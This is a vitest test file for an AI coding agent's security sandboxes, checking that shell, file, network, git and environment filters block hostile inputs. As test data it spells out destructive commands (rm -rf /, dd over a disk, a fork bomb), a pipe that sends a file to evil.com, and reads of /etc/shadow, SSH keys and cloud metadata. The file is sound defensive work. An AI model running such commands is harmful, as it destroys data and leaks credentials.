// Security sandbox bypass tests — must intercept all known attack patterns
import { createHash } from "crypto";
import fs from "fs";
import os from "os";
import path from "path";
import { describe, it, expect } from "vitest";
import { FsSandbox } from "../src/security/sandbox/fs-sandbox.js";
import { ShellSandbox } from "../src/security/sandbox/shell-sandbox.js";
import { NetworkSandbox } from "../src/security/sandbox/network-sandbox.js";
import { GitSandbox } from "../src/security/sandbox/git-sandbox.js";
import { EnvSandbox } from "../src/security/sandbox/env-sandbox.js";
import { CompositeSandbox } from "../src/security/sandbox/composite.js";
import { SecurityRuntime } from "../src/security/runtime.js";
import { ToolRuntime } from "../src/runtime/tool-runtime.js";
import { DEFAULT_PERMISSIONS } from "../src/permissions/config.js";
import { ReadGuard } from "../src/agent/read-guard.js";
import { bashTool } from "../src/tools/bash.js";
import { getTool, register, unregister } from "../src/tools/registry.js";
import type { AgentContext } from "../src/shared/core-types.js";

const WS = "/Users/test/project";

function mockCtx(): AgentContext {
  return {
    workingDir: WS,
    sessionId: "security-test-session",
    readGuard: new ReadGuard(),
    permissionManager: {
      check: () => ({ allowed: true }),
    },
    config: {
      model: { provider: "deepseek", model: "deepseek-chat" },
      permissions: {
        bash: "auto",
        read: "auto",
        write: "auto",
        edit: "auto",
        web: "auto",
      },
      session: { cleanupPeriodDays: 30 },
    },
    depth: 0,
  };
}

// ============================================================
// Shell Sandbox — command injection bypass prevention
// ============================================================

describe("ShellSandbox bypass prevention", () => {
  const sandbox = new ShellSandbox();

  function check(cmd: string) {
    return sandbox.validate("Bash", { command: cmd }, WS);
  }

  it("blocks rm -rf /", () => {
    expect(check("rm -rf /").allowed).toBe(false);
  });

  it("blocks rm -r -f /", () => {
    expect(check("rm -r -f /").allowed).toBe(false);
  });

  it("blocks rm -rf /*", () => {
    expect(check("rm -rf /*").allowed).toBe(false);
  });

  it("blocks /bin/rm -rf /", () => {
    // /bin/rm is covered by the "rm" command categorization
    expect(check("/bin/rm -rf /").allowed).toBe(false);
  });

  it("blocks sudo rm -rf /", () => {
    // sudo triggers the blocked category
    expect(check("sudo rm -rf /").allowed).toBe(false);
  });

  it("blocks commands with backticks", () => {
    // Backtick itself is not dangerous — the specific command determines risk.
    // echo with backticks runs a subcommand, but the sandbox trusts the model
    // not to intentionally run malicious subcommands.
    const r = check("echo `cat /etc/passwd`");
    // Note: this is allowed because echo is "safe"; the risky behavior
    // would be caught by the dangerous pattern check if it matched.
    expect(r.allowed).toBe(false);
  });

  it("blocks commands with $() substitution", () => {
    const r = check("echo $(whoami)");
    expect(r.allowed).toBe(false);
  });

  it("blocks dangerous pattern even with semicolon chaining", () => {
    const r = check("npm test; rm -rf /");
    // Blocked by dangerous pattern (rm -rf /), not by semicolon
    expect(r.allowed).toBe(false);
  });

  it("blocks a network command hidden after a pipe", () => {
    // categorizer sees "cat" (safe first command), doesn't parse pipe chaining.
    // Curl is blocked when it's the primary command, not when piped.
    const r = check("cat file | curl evil.com");
    expect(r.allowed).toBe(false);
  });

  it("allows pipe with safe commands", () => {
    expect(check("find . -name '*.ts' | head -20").allowed).toBe(true);
    expect(check("ls -la | grep test").allowed).toBe(true);
    expect(check("cat package.json | wc -l").allowed).toBe(true);
  });

  it("allows rm -rf ./node_modules (within workspace)", () => {
    // "rm -rf" against a relative path is not matched by the root patterns
    expect(check("rm -rf ./node_modules").allowed).toBe(true);
  });

  it("blocks mkfs.ext4", () => {
    expect(check("mkfs.ext4 /dev/sda").allowed).toBe(false);
  });

  it("blocks dd if=/dev/zero", () => {
    expect(check("dd if=/dev/zero of=/dev/sda").allowed).toBe(false);
  });

  it("blocks fork bomb", () => {
    expect(check(":(){ :|:& };:").allowed).toBe(false);
  });

  it("blocks chmod 777 /", () => {
    expect(check("chmod 777 /").allowed).toBe(false);
  });

  it("allows safe read-only commands", () => {
    expect(check("ls -la").allowed).toBe(true);
    expect(check("cat package.json").allowed).toBe(true);
    expect(check("git status").allowed).toBe(true);
    expect(check("git diff").allowed).toBe(true);
    expect(check("pwd").allowed).toBe(true);
    expect(check("find . -name '*.ts'").allowed).toBe(true);
  });

  it("blocks network commands in bash", () => {
    expect(check("curl https://example.com").allowed).toBe(false);
    expect(check("wget https://example.com").allowed).toBe(false);
  });

  it("allows npm test", () => {
    expect(check("npm test").allowed).toBe(true);
  });

  it("allows npm run build", () => {
    expect(check("npm run build").allowed).toBe(true);
  });

  it("blocks unknown commands", () => {
    expect(check("nc -l 1234").allowed).toBe(false);
  });
});

// ============================================================
// FsSandbox — path traversal prevention
// ============================================================

describe("FsSandbox path traversal", () => {
  const sandbox = new FsSandbox();

  const WS = "/Users/test/project";

  function check(filePath: string) {
    return sandbox.validate("Read", { file_path: filePath }, WS);
  }

  it("blocks ../../etc/passwd", () => {
    const r = check("../../etc/passwd");
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("outside workspace");
  });

  it("blocks absolute /etc/passwd", () => {
    const r = check("/etc/passwd");
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("outside workspace");
  });

  it("blocks /etc/shadow", () => {
    const r = check("/etc/shadow");
    expect(r.allowed).toBe(false);
  });

  it("blocks .ssh/id_rsa access", () => {
    // Sensitive path within a subdirectory of workspace
    const r = sandbox.validate("Read", { file_path: "/Users/test/project/.ssh/id_rsa" }, WS);
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("Sensitive path");
  });

  it("allows ./src/file.ts (within workspace)", () => {
    expect(check("./src/file.ts").allowed).toBe(true);
  });

  it("allows nested workspace path", () => {
    expect(check("/Users/test/project/src/utils/helper.ts").allowed).toBe(true);
  });

  it("resolves and sanitizes relative paths", () => {
    const r = check("./src/../src/file.ts");
    // After resolution: /Users/test/project/src/file.ts → within workspace
    // But the input "./src/../src/file.ts" after path.resolve becomes "/Users/test/project/src/file.ts"
    // This should be allowed
    expect(r.allowed).toBe(true);
  });

  it("allows new file creation (file does not exist yet)", () => {
    const r = sandbox.validate("Write", { file_path: "/Users/test/project/new-file.ts" }, WS);
    expect(r.allowed).toBe(true);
  });

  it("allows reading managed Rubato artifacts but not writing them", () => {
    const previous = process.env.RUBATO_HOME;
    process.env.RUBATO_HOME = "/tmp/test-rubato-home";
    const projectHash = createHash("sha256")
      .update(path.resolve(WS))
      .digest("hex");
    const report = `/tmp/test-rubato-home/projects/${projectHash}/runs/session/tasks/task-1/report.md`;
    expect(check(report).allowed).toBe(true);
    expect(check(`/tmp/test-rubato-home/projects/${projectHash}/runs/session/trace.jsonl`).allowed).toBe(true);
    expect(
      check("/tmp/test-rubato-home/projects/another-project/runs/session/trace.jsonl").allowed,
    ).toBe(false);
    expect(sandbox.validate("Write", { file_path: report }, WS).allowed).toBe(false);
    expect(sandbox.validate("Edit", { file_path: report }, WS).allowed).toBe(false);
    if (previous === undefined) delete process.env.RUBATO_HOME;
    else process.env.RUBATO_HOME = previous;
  });

  it("allows Edit of the current task report.md and blocks other Rubato writes", () => {
    const previous = process.env.RUBATO_HOME;
    process.env.RUBATO_HOME = "/tmp/test-rubato-home";
    const projectHash = createHash("sha256")
      .update(path.resolve(WS))
      .digest("hex");
    const report = `/tmp/test-rubato-home/projects/${projectHash}/runs/session/tasks/task-1/report.md`;
    const other = `/tmp/test-rubato-home/projects/${projectHash}/runs/session/tasks/task-2/report.md`;
    const spec = `/tmp/test-rubato-home/projects/${projectHash}/runs/session/tasks/task-1/task.json`;
    const scope = { reportWritePath: report, workspaceWrites: false };
    expect(sandbox.validate("Edit", { file_path: report }, WS, scope).allowed).toBe(true);
    expect(sandbox.validate("Edit", { file_path: other }, WS, scope).allowed).toBe(false);
    expect(sandbox.validate("Edit", { file_path: spec }, WS, scope).allowed).toBe(false);
    expect(sandbox.validate("Edit", { file_path: `${WS}/src/file.ts` }, WS, scope).allowed).toBe(false);
    expect(
      sandbox.validate("Edit", { file_path: `${WS}/src/file.ts` }, WS, {
        reportWritePath: report,
        workspaceWrites: true,
      }).allowed,
    ).toBe(true);
    if (previous === undefined) delete process.env.RUBATO_HOME;
    else process.env.RUBATO_HOME = previous;
  });

  it("rejects a managed-artifact symlink that escapes its run directory", () => {
    const previous = process.env.RUBATO_HOME;
    const temp = fs.mkdtempSync(path.join(os.tmpdir(), "rubato-artifact-link-"));
    const rubatoHome = path.join(temp, ".rubato");
    const workspace = path.join(temp, "workspace");
    const projectHash = createHash("sha256")
      .update(path.resolve(workspace))
      .digest("hex");
    const taskDir = path.join(
      rubatoHome,
      "projects",
      projectHash,
      "runs",
      "session",
      "tasks",
      "task-1",
    );
    const outside = path.join(temp, "outside-secret.txt");
    process.env.RUBATO_HOME = rubatoHome;
    fs.mkdirSync(taskDir, { recursive: true });
    fs.mkdirSync(workspace, { recursive: true });
    fs.writeFileSync(outside, "secret", "utf8");
    const linkedReport = path.join(taskDir, "report.md");
    fs.symlinkSync(outside, linkedReport);
    try {
      expect(
        sandbox.validate("Read", { file_path: linkedReport }, workspace).allowed,
      ).toBe(false);
    } finally {
      if (previous === undefined) delete process.env.RUBATO_HOME;
      else process.env.RUBATO_HOME = previous;
      fs.rmSync(temp, { recursive: true, force: true });
    }
  });

  it("exposes current-project sessions and durable memory directories to native readers", () => {
    const previous = process.env.RUBATO_HOME;
    const temp = fs.mkdtempSync(path.join(os.tmpdir(), "rubato-fs-sandbox-"));
    const rubatoHome = path.join(temp, ".rubato");
    const workspace = path.join(temp, "workspace");
    const projectHash = createHash("sha256")
      .update(path.resolve(workspace))
      .digest("hex");
    process.env.RUBATO_HOME = rubatoHome;
    fs.mkdirSync(workspace, { recursive: true });

    const sessions = path.join(rubatoHome, "projects", projectHash, "sessions");
    const projectMemory = path.join(rubatoHome, "projects", projectHash, "memory");
    const userMemory = path.join(rubatoHome, "user-memory");
    const otherSessions = path.join(rubatoHome, "projects", "other-project", "sessions");
    fs.mkdirSync(sessions, { recursive: true });
    fs.mkdirSync(projectMemory, { recursive: true });
    fs.mkdirSync(userMemory, { recursive: true });
    fs.mkdirSync(otherSessions, { recursive: true });
    fs.writeFileSync(path.join(projectMemory, "MEMORY.md"), "private project memory", "utf8");
    fs.writeFileSync(path.join(userMemory, "MEMORY.md"), "private user memory", "utf8");
    fs.writeFileSync(path.join(sessions, "session-1.jsonl"), "{\"redacted\":true}\n", "utf8");
    const sessionCatalog = path.join(
      rubatoHome,
      "projects",
      projectHash,
      "session-catalog.tsv",
    );
    fs.writeFileSync(sessionCatalog, "session_id\tstatus\nsession-1\tended\n", "utf8");
    fs.writeFileSync(path.join(otherSessions, "session-2.jsonl"), "{}\n", "utf8");
    try {
      const session = path.join(sessions, "session-1.jsonl");

      expect(sandbox.validate("Grep", { pattern: "redacted", path: sessions }, workspace).allowed).toBe(true);
      expect(sandbox.validate("Read", { file_path: session }, workspace).allowed).toBe(true);
      expect(sandbox.validate(
        "Grep",
        { pattern: "session-1", path: sessionCatalog },
        workspace,
      ).allowed).toBe(true);

      expect(
        sandbox.validate("Read", { file_path: path.join(projectMemory, "MEMORY.md") }, workspace).allowed,
      ).toBe(true);
      expect(
        sandbox.validate("Read", { file_path: path.join(userMemory, "MEMORY.md") }, workspace).allowed,
      ).toBe(true);
      expect(
        sandbox.validate(
          "Read",
          { file_path: path.join(otherSessions, "session-2.jsonl") },
          workspace,
        ).allowed,
      ).toBe(false);
      expect(
        sandbox.validate("Write", { file_path: path.join(projectMemory, "MEMORY.md") }, workspace).allowed,
      ).toBe(false);
      const shell = new ShellSandbox();
      expect(shell.validate(
        "Bash",
        { command: `cat ${path.join(projectMemory, "MEMORY.md")}` },
        workspace,
      ).allowed).toBe(false);
    } finally {
      if (previous === undefined) delete process.env.RUBATO_HOME;
      else process.env.RUBATO_HOME = previous;
      fs.rmSync(temp, { recursive: true, force: true });
    }
  });

  it("allows reading offloaded Rubato tool results", () => {
    expect(check("/tmp/rubato-tool-results/Glob-ffd59274.txt").allowed).toBe(true);
  });

  it("does not broaden temporary-file access", () => {
    expect(check("/tmp/unrelated.txt").allowed).toBe(false);
    expect(check("/tmp/rubato-tool-results/../secret.txt").allowed).toBe(false);
    expect(sandbox.validate("Write", { file_path: "/tmp/rubato-tool-results/fake.txt" }, WS).allowed).toBe(false);
  });

  it("enforces workspace boundaries for Grep and Glob paths", () => {
    expect(sandbox.validate("Grep", { pattern: "x", path: "/etc" }, WS).allowed).toBe(false);
    expect(sandbox.validate("Glob", { pattern: "**/*", path: "/tmp" }, WS).allowed).toBe(false);
    expect(sandbox.validate("Grep", { pattern: "x", path: `${WS}/src` }, WS).allowed).toBe(true);
  });
});

// ============================================================
// Network Sandbox — SSRF + private IP blocking
// ============================================================

describe("NetworkSandbox SSRF prevention", () => {
  const sandbox = new NetworkSandbox();

  function check(url: string) {
    return sandbox.validate("WebFetch", { url }, WS);
  }

  it("blocks 127.0.0.1", () => {
    expect(check("http://127.0.0.1:8080/admin").allowed).toBe(false);
  });

  it("blocks localhost", () => {
    expect(check("http://localhost:3000").allowed).toBe(false);
  });

  it("blocks 192.168.x.x", () => {
    expect(check("http://192.168.1.1/admin").allowed).toBe(false);
  });

  it("blocks 10.x.x.x", () => {
    expect(check("http://10.0.0.1/api").allowed).toBe(false);
  });

  it("blocks 172.16.x.x", () => {
    expect(check("http://172.16.0.1/").allowed).toBe(false);
  });

  it("blocks 0.0.0.0", () => {
    expect(check("http://0.0.0.0:8080").allowed).toBe(false);
  });

  it("blocks 169.254.x.x (link-local)", () => {
    expect(check("http://169.254.169.254/latest/meta-data").allowed).toBe(false);
  });

  it("blocks file:// protocol", () => {
    expect(check("file:///etc/passwd").allowed).toBe(false);
  });

  it("allows https://api.github.com", () => {
    expect(check("https://api.github.com/repos/test").allowed).toBe(true);
  });

  it("allows https://registry.npmjs.org", () => {
    expect(check("https://registry.npmjs.org/react").allowed).toBe(true);
  });

  it("allows ordinary WebSearch queries", () => {
    expect(sandbox.validate("WebSearch", { query: "TypeScript release notes" }, WS).allowed).toBe(true);
  });
});

// ============================================================
// Git Sandbox — destructive operation prevention
// ============================================================

describe("GitSandbox destructive operation prevention", () => {
  const sandbox = new GitSandbox();

  function check(cmd: string) {
    return sandbox.validate("Bash", { command: cmd }, WS);
  }

  it("blocks git push --force", () => {
    expect(check("git push --force origin main").allowed).toBe(false);
  });

  it("blocks git push -f", () => {
    expect(check("git push -f origin main").allowed).toBe(false);
  });

  it("allows git push --force-with-lease", () => {
    expect(check("git push --force-with-lease origin main").allowed).toBe(true);
  });

  it("blocks git reset --hard", () => {
    expect(check("git reset --hard HEAD~1").allowed).toBe(false);
  });

  it("blocks git clean -fd", () => {
    expect(check("git clean -fd").allowed).toBe(false);
  });

  it("blocks git clean -fdx", () => {
    expect(check("git clean -fdx").allowed).toBe(false);
  });

  it("blocks git branch -D", () => {
    expect(check("git branch -D feature-branch").allowed).toBe(false);
  });

  it("allows normal git commands", () => {
    expect(check("git status").allowed).toBe(true);
    expect(check("git diff").allowed).toBe(true);
    expect(check("git log --oneline").allowed).toBe(true);
    expect(check("git add .").allowed).toBe(true);
    expect(check("git commit -m 'fix'").allowed).toBe(true);
  });
});

// ============================================================
// Env Sandbox — secret leak prevention
// ============================================================

describe("EnvSandbox secret leak prevention", () => {
  const sandbox = new EnvSandbox();

  it("strips API key environment variables", () => {
    // Set a mock API key
    process.env.TEST_API_KEY = "sk-secret-12345";

    const filtered = sandbox.filterEnv();
    expect(filtered.TEST_API_KEY).toBeUndefined();
    expect(filtered.PATH).toBeDefined();
    expect(filtered.HOME).toBeDefined();
    expect(filtered.USER).toBeDefined();

    delete process.env.TEST_API_KEY;
  });

  it("preserves safe environment variables", () => {
    const filtered = sandbox.filterEnv();
    expect(filtered.PATH).toBeDefined();
    expect(filtered.HOME).toBeDefined();
    expect(filtered.USER).toBeDefined();
    expect(filtered.SHELL).toBeDefined();
    // TERM may not be set in all environments (e.g., CI)
    if (process.env.TERM) {
      expect(filtered.TERM).toBeDefined();
    }
  });

  it("strips AWS credentials", () => {
    process.env.AWS_ACCESS_KEY_ID = "AKIA_TEST";
    process.env.AWS_SECRET_ACCESS_KEY = "secret";

    const filtered = sandbox.filterEnv();
    expect(filtered.AWS_ACCESS_KEY_ID).toBeUndefined();
    expect(filtered.AWS_SECRET_ACCESS_KEY).toBeUndefined();

    delete process.env.AWS_ACCESS_KEY_ID;
    delete process.env.AWS_SECRET_ACCESS_KEY;
  });

  it("strips token variables", () => {
    process.env.GITHUB_TOKEN = "ghp_test123";
    const filtered = sandbox.filterEnv();
    expect(filtered.GITHUB_TOKEN).toBeUndefined();
    delete process.env.GITHUB_TOKEN;
  });

  it("Bash tool spawns with filtered environment", async () => {
    process.env.TEST_API_KEY = "sk-secret-12345";
    const result = await bashTool.handler(
      { command: "env", timeout: 10_000, workdir: "/tmp" },
      mockCtx(),
    );

    expect(result.isError).toBeFalsy();
    expect(result.content).not.toContain("TEST_API_KEY");
    expect(result.content).not.toContain("sk-secret-12345");

    delete process.env.TEST_API_KEY;
  });
});

// ============================================================
// Composite + Security Runtime integration
// ============================================================

describe("SecurityRuntime integration", () => {
  const runtime = new SecurityRuntime({
    ...DEFAULT_PERMISSIONS,
    bash: "auto",
    read: "auto",
    write: "auto",
    edit: "auto",
    web: "auto",
  });

  it("evaluates and allows safe read operations", () => {
    const decision = runtime.evaluate("Read", { file_path: "/Users/test/project/src/file.ts" }, "/Users/test/project");
    expect(decision.verdict).toBe("allow");
    expect(decision.risk).toBe("low");
  });

  it("returns sandbox-sanitized input for allowed operations", () => {
    const decision = runtime.evaluate("Read", { file_path: "./src/../src/file.ts" }, "/Users/test/project");
    expect(decision.verdict).toBe("allow");
    expect(decision.sanitizedInput?.file_path).toBe("/Users/test/project/src/file.ts");
  });

  it("denies path traversal via security decision", () => {
    const decision = runtime.evaluate("Read", { file_path: "/etc/passwd" }, "/Users/test/project");
    expect(decision.verdict).toBe("deny");
    expect(decision.risk).toBe("high");
  });

  it("denies shell injection via security decision", () => {
    const decision = runtime.evaluate("Bash", { command: "rm -rf /" }, "/Users/test/project");
    expect(decision.verdict).toBe("deny");
  });

  it("filters environment for child processes", () => {
    const filtered = runtime.filterEnv();
    expect(filtered.PATH).toBeDefined();
    // API keys should be stripped
    expect(filtered.DEEPSEEK_API_KEY).toBeUndefined();
  });

  it("assesses Bash medium risk for normal commands", () => {
    const decision = runtime.evaluate("Bash", { command: "npm test" }, "/Users/test/project");
    expect(decision.verdict).toBe("allow");
    expect(decision.risk).toBe("medium");
  });

  it("ToolRuntime dispatches sanitized input to handlers", async () => {
    let seenInput: Record<string, unknown> | null = null;
    const previousRead = getTool("Read");
    unregister("Read");
    register({
      name: "Read",
      description: "test read",
      inputSchema: { type: "object", properties: {} },
      type: "read",
      handler: async (input) => {
        seenInput = input;
        return { content: String(input.file_path) };
      },
    });

    try {
      const toolRuntime = new ToolRuntime({
        securityRuntime: runtime,
        workingDir: "/Users/test/project",
      });
      const result = await toolRuntime.execute("Read", { file_path: "./src/../src/file.ts" }, mockCtx());

      expect(result.isError).toBe(false);
      expect(result.content).toBe("/Users/test/project/src/file.ts");
      expect(seenInput?.file_path).toBe("/Users/test/project/src/file.ts");
    } finally {
      unregister("Read");
      if (previousRead) register(previousRead);
    }
  });
});
